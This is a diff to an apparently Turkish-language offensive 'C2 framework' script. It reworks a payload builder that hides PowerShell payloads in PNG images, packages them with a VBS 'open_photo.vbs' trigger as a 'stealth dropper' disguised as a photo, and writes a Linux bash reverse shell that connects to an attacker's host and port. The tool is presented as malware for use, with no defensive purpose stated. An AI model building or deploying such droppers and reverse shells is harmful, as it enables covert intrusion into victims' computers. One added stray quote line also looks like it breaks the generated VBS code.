@@ -15,6 +15,12 @@ import random
 import string
 import subprocess
 
+for stream in (sys.stdout, sys.stderr):
+    try:
+        stream.reconfigure(errors="replace")
+    except (AttributeError, ValueError):
+        pass
+
 # ANSI Renk Kodları
 class C:
     RED = '\033[91m'
@@ -283,6 +289,7 @@ For idx = 1 To payLen
     result = result & Chr(pb Xor kb)
 Next
 
+'''
     vbs += '''
 ' ── PowerShell Başlat ──
 '''
@@ -327,7 +334,7 @@ def c2_payload_builder():
 
     print_line()
     print(f"\n{C.BLUE}{C.BOLD}  --- Hedef Sistem ---{C.RESET}")
-    print(f"  {C.CYAN}1){C.RESET} Windows (Steganografik PNG / Dropper)")
+    print(f"  {C.CYAN}1){C.RESET} Windows (Steganografik PNG)")
     print(f"  {C.CYAN}2){C.RESET} Linux (Bash Reverse Shell)")
 
     os_choice = input(f"\n{C.CYAN}  [>] Seçiminiz: {C.RESET}").strip()
@@ -336,7 +343,7 @@ def c2_payload_builder():
         print_line()
         print(f"\n{C.BLUE}{C.BOLD}  --- Windows Payload Formatı ---{C.RESET}")
         print(f"  {C.CYAN}1){C.RESET} Steganografik PNG  {C.DIM}— Payload görsel içine gömülür{C.RESET}")
-        print(f"  {C.CYAN}2){C.RESET} Dropper Paketi     {C.DIM}— PNG + VBS dropper (tam paket){C.RESET}")
+        print(f"  {C.CYAN}2){C.RESET} Tek PNG           {C.DIM}— VBS oluşturmadan tek görsel dosyası{C.RESET}")
 
         fmt_choice = input(f"\n{C.CYAN}  [>] Seçiminiz: {C.RESET}").strip()
 
@@ -352,14 +359,6 @@ def c2_payload_builder():
             return
 
         if fmt_choice == '1':
-            out_png = "payload_image.png"
-            key_b64, err = embed_in_png(img_path, full_ps, out_png)
-            if err:
-                print(f"{C.RED}  [-] Hata: {err}{C.RESET}")
-            else:
-                print(f"\n{C.GREEN}{C.BOLD}  [+] STEGANOGRAFİK PNG HAZIR: {out_png}{C.RESET}")
-        
-        elif fmt_choice == '2':
             output_dir = "stealth_dropper"
             os.makedirs(output_dir, exist_ok=True)
             png_name = "photo.png"
@@ -376,8 +375,19 @@ def c2_payload_builder():
                 vbs_path = os.path.join(output_dir, "open_photo.vbs")
                 save_text(vbs_path, vbs_content)
                 print(f"\n{C.GREEN}{C.BOLD}  [+] STEALTH DROPPER PAKETİ HAZIR: {output_dir}/{C.RESET}")
-                print(f"{C.WHITE}      1) {png_name} (Zararlı PNG){C.RESET}")
-                print(f"{C.WHITE}      2) open_photo.vbs (Tetikleyici){C.RESET}")
+                print(f"{C.WHITE}      1) {png_name} (Zararlı Payload İçeren Görsel){C.RESET}")
+                print(f"{C.WHITE}      2) open_photo.vbs (Tetikleyici VBS Scripti){C.RESET}")
+        
+        elif fmt_choice == '2':
+            png_name = "photo.png"
+            out_png = png_name
+
+            key_b64, err = embed_in_png(img_path, full_ps, out_png)
+            if err:
+                print(f"{C.RED}  [-] Hata: {err}{C.RESET}")
+            else:
+                print(f"\n{C.GREEN}{C.BOLD}  [+] TEK PNG HAZIR: {os.path.abspath(out_png)}{C.RESET}")
+                print(f"{C.WHITE}      1) {png_name} (Pasif PNG - VBS oluşturulmadı){C.RESET}")
 
     elif os_choice == '2':
         payload = f"#!/bin/bash\nbash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
@@ -611,7 +621,7 @@ def main_menu():
                 clear_screen()
                 print_banner()
                 print(f"{C.BOLD}  C2 FRAMEWORK:{C.RESET}\n")
-                print(f"  {C.CYAN}1){C.RESET} Payload Builder (Gizli Virüs PNG / Shell)")
+                print(f"  {C.CYAN}1){C.RESET} Payload Builder (Tek PNG / Shell)")
                 print(f"  {C.CYAN}2){C.RESET} Listener (Saldırgan Dinleyicisi)")
                 print(f"  {C.CYAN}0){C.RESET} Geri Dön\n")
                 try:
